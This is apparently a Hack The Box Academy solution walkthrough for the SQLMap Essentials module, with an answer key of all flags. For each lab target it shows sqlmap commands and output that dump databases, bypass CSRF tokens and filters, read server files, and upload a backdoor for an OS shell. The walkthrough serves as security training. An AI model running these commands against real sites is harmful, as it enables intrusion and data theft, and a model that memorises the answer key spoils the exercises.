![[cheatsheat-SQLMap Essentials]]

## Section Questions and their Answers

|Section|Question Number|Answer|
|---|---|---|
|SQLMap Overview|Question 1|UNION query-based|
|Running SQLMap on an HTTP Request|Question 1|HTB{700_much_c0n6r475_0n_p057_r3qu357}|
|Running SQLMap on an HTTP Request|Question 2|HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}|
|Running SQLMap on an HTTP Request|Question 3|HTB{j450n_v00rh335_53nd5_6r475}|
|Attack Tuning|Question 1|HTB{700_much_r15k_bu7_w0r7h_17}|
|Attack Tuning|Question 2|HTB{v1nc3_mcm4h0n_15_4570n15h3d}|
|Attack Tuning|Question 3|HTB{un173_7h3_un173d}|
|Database Enumeration|Question 1|HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}|
|Advanced Database Enumeration|Question 1|PARAMETER_STYLE|
|Advanced Database Enumeration|Question 2|Enizoom1609|
|Bypassing Web Application Protections|Question 1|HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}|
|Bypassing Web Application Protections|Question 2|HTB{700_much_r4nd0mn355_f0r_my_74573}|
|Bypassing Web Application Protections|Question 3|HTB{y37_4n07h3r_r4nd0m1z3}|
|Bypassing Web Application Protections|Question 4|HTB{5p3c14l_ch4r5_n0_m0r3}|
|OS Exploitation|Question 1|HTB{5up3r_u53r5_4r3_p0w3rful!}|
|OS Exploitation|Question 2|HTB{n3v3r_run_db_45_db4}|
|Skills Assessment|Question 1|HTB{n07_50_h4rd_r16h7?!}|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# SQLMap Overview

## Question 1

### "What's the fastest SQLi type?"

The fastest SQLi type is those that are `UNION query-based`:

![SQLMap_Essentials_image_1.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_1.png)

Answer: `UNION query-based`

# Running SQLMap on an HTTP Request

## Question 1

### "What's the contents of table flag2? (Case #2)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #2":

![SQLMap_Essentials_image_2.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_2.png)

Students will notice that they need to exploit the SQLi in the `id` `POST` parameter:

![SQLMap_Essentials_image_3.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_3.png)

Thus, the `sqlmap` command will be as follows:

Code: shell

```shell
sqlmap -u 'http://STMIP:STMPO/case2.php' --data 'id=1' --batch --dump
```

```shell-session
┌─[us-academy-1]─[10.10.14.25]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u "http://188.166.168.88:31227/case2.php" --data 'id=1' --batch --dump

        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

<SNIP>

Database: testdb
Table: flag2
[1 entry]
+----+----------------------------------------+
| id | content                                |
+----+----------------------------------------+
| 1  | HTB{700_much_c0n6r475_0n_p057_r3qu357} |
+----+----------------------------------------+

[19:27:11] [INFO] table 'testdb.flag2' dumped to CSV file '/home/htb-ac413848/.local/share/sqlmap/output/188.166.168.88/dump/testdb/flag2.csv'
[19:27:11] [INFO] fetched data logged to text files under '/home/htb-ac413848/.local/share/sqlmap/output/188.166.168.88'
[19:27:11] [WARNING] your sqlmap version is outdated

[*] ending @ 19:27:11 /2022-07-14/
```

Answer: `HTB{700_much_c0n6r475_0n_p057_r3qu357}`

# Running SQLMap on an HTTP Request

## Question 2

### "What's the contents of table flag3? (Case #3)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #3" to notice that they need to exploit the vulnerable cookie header `id`:

![SQLMap_Essentials_image_4.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_4.png)

Thus, the `sqlmap` command will be as follows:

Code: shell

```shell
sqlmap -u 'http://STMIP:STMPO/case3.php' -H 'Cookie: id=*' --batch --dump
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://206.189.24.232:30991/case3.php' -H 'Cookie: id=*' --batch --dump

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ 17:23:43 /2022-09-29/

<SNIP>

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[17:23:43] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid

[17:23:46] [INFO] (custom) HEADER parameter 'Cookie #1*' is 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' injectable

<SNIP>

[17:25:14] [INFO] fetching columns for table 'flag3' in database 'testdb'
[17:25:14] [INFO] retrieved: 'id','int(11)'
[17:25:14] [INFO] retrieved: 'content','varchar(512)'
[17:25:14] [INFO] fetching entries for table 'flag3' in database 'testdb'                       
Database: testdb
Table: flag3
[1 entry]
+----+------------------------------------------+
| id | content                                  |
+----+------------------------------------------+
| 1  | HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475} |
+----+------------------------------------------+

<SNIP>
```

Answer: `HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}`

# Running SQLMap on an HTTP Request

## Question 3

### "What's the contents of table flag4? (Case #4)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #4" to notice that they need to exploit the JSON value `id`:

![SQLMap_Essentials_image_5.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_5.png)

Here, students need to intercept the request being sent so that they can use it with `sqlmap`; to intercept the request, students can either use an intercepting proxy (such as `BurpSuite`) or, the Web Developer Tools of the browser. To do so with the latter, students first need to open the Network Tab (`Ctrl` + `Shift` + `E` for Windows or `Cmd` + `Opt` + `E` for Mac) then refresh the page to notice the `POST` request to "case4.php". Students need to click on it, then, on the right side scroll down until "Request Headers" and switch to "Raw" to copy the request headers (and save them into a file):

![SQLMap_Essentials_image_6.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_6.png)

Then, students need to click on "Request", switch on "Raw", and copy the data so that it can be appended after the request headers:

![SQLMap_Essentials_image_7.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_7.png)

The final request will look like the following:

```shell-session
POST /case4.php HTTP/1.1
Host: 206.189.24.232:30991
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 8
Origin: http://206.189.24.232:30991
DNT: 1
Connection: keep-alive
Referer: http://206.189.24.232:30991/case4.php
Sec-GPC: 1

{"id":1}
```

Now that the request is saved in a file, students need to provide it to `sqlmap`:

Code: shell

```shell
sqlmap -r req.txt --batch --dump
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -r request.txt --batch --dump

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.8#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:07:45 /2022-09-29/

<SNIP>

Database: testdb
Table: flag4
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{j450n_v00rh335_53nd5_6r475} |
+----+---------------------------------+

<SNIP>
```

Answer: `HTB{j450n_v00rh335_53nd5_6r475}`

# Attack Tuning

## Question 1

### "What's the contents of table flag5? (Case #5)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #5" to notice that they need to exploit the `GET` parameter `id`:

![SQLMap_Essentials_image_8.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_8.png)

Thus, the `sqlmap` command will be as follows (`-T flag5` specifies the table to be dumped, instead of all the tables):

Code: shell

```shell
sqlmap -u 'http://STMIP:STMPO/case5.php?id=*' --level 5 --risk 3 -T flag5 --batch --dump
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://206.189.24.232:30991/case5.php?id=*' --level 5 --risk 3 -T flag5 --batch --dump

        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.8#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[18:20:58] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly

<SNIP>

Database: testdb
Table: flag5
[1 entry]
+----+---------------------------------------+
| id | content                               |
+----+---------------------------------------+
| 1  | HTB{700_much_r15k_bu7_w0r7h_17}       |
+----+---------------------------------------+
```

Answer: `HTB{700_much_r15k_bu7_w0r7h_17}`

# Attack Tuning

## Question 2

### "What's the contents of table flag6? (Case #6)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #6" to notice that they need to exploit the `GET` parameter `col` that has non-standard boundaries:

![SQLMap_Essentials_image_9.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_9.png)

Thus, the `sqlmap` command will be:

Code: shell

```shell
sqlmap -u 'http://STMIP:STMPO/case6.php?col=id' --prefix='`)' --batch -T flag6 --dump
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://206.189.24.232:31764/case6.php?col=id' --prefix='`)' --batch --dump

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

Database: testdb
Table: flag6
[1 entry]
+----+----------------------------------+
| id | content                          |
+----+----------------------------------+
| 1  | HTB{v1nc3_mcm4h0n_15_4570n15h3d} |
+----+----------------------------------+

<SNIP>
```

Answer: `HTB{v1nc3_mcm4h0n_15_4570n15h3d}`

# Attack Tuning

## Question 3

### "What's the contents of table flag7? (Case #7)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #7" to notice that they need to exploit the `GET` parameter `id` by using the UNION query-based technique (for a total number of five columns):

![SQLMap_Essentials_image_10.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_10.png)

Thus, the `sqlmap` command will be:

Code: shell

```shell
sqlmap -u 'http://STMIP:STMPO/case7.php?id=1' -T flag7 --technique=U --union-cols=5 --dump
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://206.189.24.232:31764/case7.php?id=1' --technique=U --union-cols=5 --batch --dump

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

Database: testdb
Table: flag7
[1 entry]
+----+-----------------------+
| id | content               |
+----+-----------------------+
| 1  | HTB{un173_7h3_un173d} |
+----+-----------------------+
```

Answer: `HTB{un173_7h3_un173d}`

# Database Enumeration

## Question 1

### "What's the contents of table flag1 in the testdb database? (Case #1)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #1" to notice that they need to exploit the `GET` parameter `id`:

![SQLMap_Essentials_image_11.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_11.png)

Thus, the `sqlmap` command will be (`-D testdb` specifies that the database "testdb" will be used to retrieve data from, and `-T flag1` specifies the table name within the database):

Code: shell

```shell
sqlmap -u 'http://STMIP:STMPO/case1.php?id=1' -D testdb -T flag1 --batch --dump
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://206.189.24.232:31764/case1.php?id=1' -D 'testdb' -T flag1 --batch --dump

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

Database: testdb
Table: flag1
[1 entry]
+----+-----------------------------------------------------+
| id | content                                             |
+----+-----------------------------------------------------+
| 1  | HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
+----+-----------------------------------------------------+

<SNIP>
```

Answer: `HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}`

# Advanced Database Enumeration

## Question 1

### "What's the name of the column containing "style" in it's name? (Case #1)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #1" to notice that they need to exploit the `GET` parameter `id`:

![SQLMap_Essentials_image_11.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_11.png)

Thus, the `sqlmap` command will be:

Code: shell

```shell
sqlmap -u 'http://STMIP:STMPO/case1.php?id=1' --search -C style --batch
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://206.189.24.232:31764/case1.php?id=1' --search -C style --batch

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

columns LIKE 'style' were found in the following databases:
Database: information_schema
Table: ROUTINES
[1 column]
+-----------------+------------+
| Column          | Type       |
+-----------------+------------+
| PARAMETER_STYLE | varchar(8) |
+-----------------+------------+

<SNIP>
```

Answer: `PARAMETER_STYLE`

# Advanced Database Enumeration

## Question 2

### "What's the Kimberly user's password? (Case #1)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #1" to notice that they need to exploit the `GET` parameter `id`:

![SQLMap_Essentials_image_11.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_11.png)

Thus, the `sqlmap` command will be:

Code: shell

```shell
sqlmap -u 'http://STMIP:STMPO/case1.php?id=1' --batch --dump
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://206.189.24.232:31764/case1.php?id=1' --batch --dump

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

Database: testdb                                                                                                                                          
Table: users
[32 entries]
<SNIP>
| 6 | 5143241665092174 | Kimberly Wright | KimberlyMWright@gmail.com | 440-232-3739 | 3136 Ralph Drive | June 18 1972 | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609) | Electrologist |

<SNIP>
```

From the output, students will know that the password of `Kimberly` is `Enizoom1609`.

Answer: `Enizoom1609`

# Bypassing Web Application Protections

## Question 1

### "What's the contents of table flag8? (Case #8)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #8" to notice that they need to exploit the `POST` parameter `id`, while accounting for the `anti-CSRF` protection header:

![SQLMap_Essentials_image_12.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_12.png)

Students need to click on the "Submit" button, then open the Network Tab to view the request form data after selecting the `POST` request to "case8.php" that includes the `anti-CSRF` token name and value:

![SQLMap_Essentials_image_13.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_13.png)

Thus, the `sqlmap` command becomes:

Code: shell

```shell
sqlmap -u 'http://STMIP:STMPO/case8.php?' --data 'id=1&t0ken=UDWvZvcqUsowsv6b5MhaSojBVJjkW0DVcNKXnZ2Fjw' --csrf-token=t0ken --batch --dump
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://206.189.24.232:31764/case8.php?' --data 'id=1&t0ken=UDWvZvcqUsowsv6b5MhaSojBVJjkW0DVcNKXnZ2Fjw' --csrf-token=t0ken --batch --dump

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

Database: testdb
Table: flag8
[1 entry]
+----+-----------------------------------+
| id | content                           |
+----+-----------------------------------+
| 1  | HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d} |
+----+-----------------------------------+
```

Answer: `HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}`

# Bypassing Web Application Protections

## Question 2

### "What's the contents of table flag9? (Case #9)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #9" to notice that they need to exploit the `POST` parameter `id`, while accounting for the unique `uid`:

![SQLMap_Essentials_image_14.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_14.png)

Given that the `uid` is in the URL (students will have a different value for it), the `sqlmap` command becomes:

Code: shell

```shell
sqlmap -u "http://STMIP:STMPO/case9.php?id=1&uid=2946408471" --randomize=uid --batch --dump
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://206.189.24.232:31764/case9.php?id=1&uid=2946408471' --randomize=uid --batch --dump

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

Database: testdb
Table: flag9
[1 entry]
+----+---------------------------------------+
| id | content                               |
+----+---------------------------------------+
| 1  | HTB{700_much_r4nd0mn355_f0r_my_74573} |
+----+---------------------------------------+

<SNIP>
```

Answer: `HTB{700_much_r4nd0mn355_f0r_my_74573}`

# Bypassing Web Application Protections

## Question 3

### "What's the contents of table flag10? (Case #10)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #10" to notice that they need to exploit the `POST` parameter `id`:

![SQLMap_Essentials_image_15.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_15.png)

Thus, the `sqlmap` command becomes:

Code: shell

```shell
sqlmap -u 'http://STMIP:STMPO/case10.php' --data="id=1" --random-agent --batch --dump
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://206.189.24.232:31764/case10.php' --data="id=1" --random-agent --batch --dump

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

Database: testdb
Table: flag10
[1 entry]
+----+----------------------------+
| id | content                    |
+----+----------------------------+
| 1  | HTB{y37_4n07h3r_r4nd0m1z3} |
+----+----------------------------+

<SNIP>
```

Answer: `HTB{y37_4n07h3r_r4nd0m1z3}`

# Bypassing Web Application Protections

## Question 4

### "What's the contents of table flag11? (Case #11)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #11" to notice that they need to exploit the `GET` parameter `id`:

![SQLMap_Essentials_image_16.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_16.png)

Thus, the `sqlmap` command becomes:

Code: shell

```shell
sqlmap -u 'http://STMIP:STMPO/case11.php?id=1' --tamper=between -T flag11 --batch --dump
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://206.189.24.232:31764/case11.php?id=1' --tamper=between -T flag11 --batch --dump

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

Database: testdb
Table: flag11
[1 entry]
+----+----------------------------+
| id | content                    |
+----+----------------------------+
| 1  | HTB{5p3c14l_ch4r5_n0_m0r3} |
+----+----------------------------+

<SNIP>
```

Answer: `HTB{5p3c14l_ch4r5_n0_m0r3}`

# OS Exploitation

## Question 1

### "Try to use SQLMap to read the file "/var/www/html/flag.txt"."

Students first need to navigate to the website's root page of the spawned target to notice that they need to exploit the `GET` parameter `id`:

![SQLMap_Essentials_image_17.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_17.png)

Thus, the `sqlmap` command becomes:

Code: shell

```shell
sqlmap -u "http://STMIP:STMPO?id=1" --file-read "/var/www/html/flag.txt" --batch
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://138.68.156.57:31020?id=1' --file-read "/var/www/html/flag.txt" --batch

        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

[19:58:10] [INFO] the local file '/home/htb-ac413848/.local/share/sqlmap/output/138.68.156.57/files/_var_www_html_flag.txt' and the remote file '/var/www/html/flag.txt' have the same size (31 B)
files saved to [1]:
[*] /home/htb-ac413848/.local/share/sqlmap/output/138.68.156.57/files/_var_www_html_flag.txt (same file)

[19:58:10] [INFO] fetched data logged to text files under '/home/htb-ac413848/.local/share/sqlmap/output/138.68.156.57'
```

`sqlmap` will save the flag file using a different name, thus, students need to change it accordingly when trying to print it out:

```shell
cat /home/htb-ac413848/.local/share/sqlmap/output/138.68.156.57/files/_var_www_html_flag.txt
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat /home/htb-ac413848/.local/share/sqlmap/output/138.68.156.57/files/_var_www_html_flag.txt

HTB{5up3r_u53r5_4r3_p0w3rful!}
```

Answer: `HTB{5up3r_u53r5_4r3_p0w3rful!}`

# OS Exploitation

## Question 2

### "Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host."

Students first need to navigate to the website's root page of the spawned target to notice that they need to exploit the `GET` parameter `id`:

![SQLMap_Essentials_image_17.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_17.png)

Thus, the `sqlmap` command becomes:

```shell
sqlmap -u 'http://STMIP:STMPO/?id=1' --os-shell --technique=E --batch
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://138.68.156.57:31020?id=1' --os-shell --technique=E --batch

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
      
<SNIP>

[20:12:26] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[20:12:26] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://138.68.156.57:31020/tmpubgkr.php
[20:12:26] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://138.68.156.57:31020/tmpbanpa.php
[20:12:26] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y

command standard output: 'www-data'
```

Once students obtain a shell, they can print out the flag file "flag.txt" that is under the root directory:

```shell
cat /flag.txt
```

```shell-session
os-shell> cat /flag.txt

do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'HTB{n3v3r_run_db_45_db4}'
```

Answer: `HTB{n3v3r_run_db_45_db4}`

# Skills Assessment

## Question 1

### "What's the contents of table final_flag?"

After spawning the target machine, students need to visit its website's root page and inspect the web application for possible attack vectors:

![SQLMap_Essentials_image_18.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_18.png)

Students then need to click all buttons while having the Network tab of the Web Developer tools open, searching for a `POST` request that can be abused. The only button that sends a `POST` request is under `Catalog` -> `Shop`, specifically, the `ADD TO CART +` button on an item:

![SQLMap_Essentials_image_19.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_19.png)

Therefore, students need to select the request and copy the raw request headers, in addition to the raw request payload, and save them into a file:

![SQLMap_Essentials_image_20.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_20.png)

![SQLMap_Essentials_image_21.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_21.png)

The final request file that will be provided to `sqlmap` is:

```shell-session
POST /action.php HTTP/1.1
Host: STMIP:STMPO
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 8
Origin: http://178.62.91.22:31147
DNT: 1
Connection: keep-alive
Referer: http://STMIP:STMPO/shop.html
Sec-GPC: 1

{"id":1}
```

Once students have saved the request into a file, they need to launch `sqlmap` providing it to the option `-r`. After trial and error, students will come to know that the options `--level 5`, `--risk 3`, `--random-agent`, `--tamper=between`, and `--technique=t` are all required to bypass the protections put forth to protect the database. Afterward, when students run `sqlmap` with these options, they will discover the database `production` and the table `final_flag` within it:

```shell
sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t
```

```shell-session
┌┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-jhizwe8dgn]─[~]
└──╼ [★]$ sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:42:13 /2022-11-29/

[18:42:13] [INFO] parsing HTTP request from 'request.req'
[18:42:13] [INFO] loading tamper module 'between'
[18:42:13] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1) Gecko/20060916 Firefox/2.0b2' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[18:42:14] [INFO] resuming back-end DBMS 'mysql' 
[18:42:14] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 7108 FROM (SELECT(SLEEP(5)))iDXK)"}

<SNIP>

[18:42:29] [INFO] adjusting time delay to 1 second due to good response times
production
[18:43:02] [INFO] fetching tables for database: 'production'
[18:43:02] [INFO] fetching number of tables for database 'production'
[18:43:02] [INFO] retrieved: 5
[18:43:04] [INFO] retrieved: categories
[18:43:31] [INFO] retrieved: brands
[18:43:49] [INFO] retrieved: products
[18:44:18] [INFO] retrieved: order_items
[18:44:55] [INFO] retrieved: final_flag
[18:45:29] [INFO] fetching columns for table 'order_items' in database 'production'
[18:45:29] [INFO] retrieved: ^C
```

Therefore, instead of letting `sqlmap` fetch unwanted data, students can stop it (`Ctrl` + `C`) and only make it fetch the table `final_flag` within the database `production`, finding the flag `HTB{n07_50_h4rd_r16h7?!}`:

```shell
sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t -D production -T final_flag
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-7lpyzphcoo]─[~]
└──╼ [★]$ sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t -D production -T final_flag
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.8#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:54:34 /2022-11-29/

[18:54:34] [INFO] parsing HTTP request from 'request.req'
[18:54:34] [INFO] loading tamper module 'between'
[18:54:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110208 Firefox/4.2a1pre' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[18:54:34] [INFO] testing connection to the target URL

<SNIP>

sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 7393 FROM (SELECT(SLEEP(5)))ZWNA)"}
---
[18:55:40] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[18:55:40] [INFO] the back-end DBMS is MySQL
[18:55:40] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
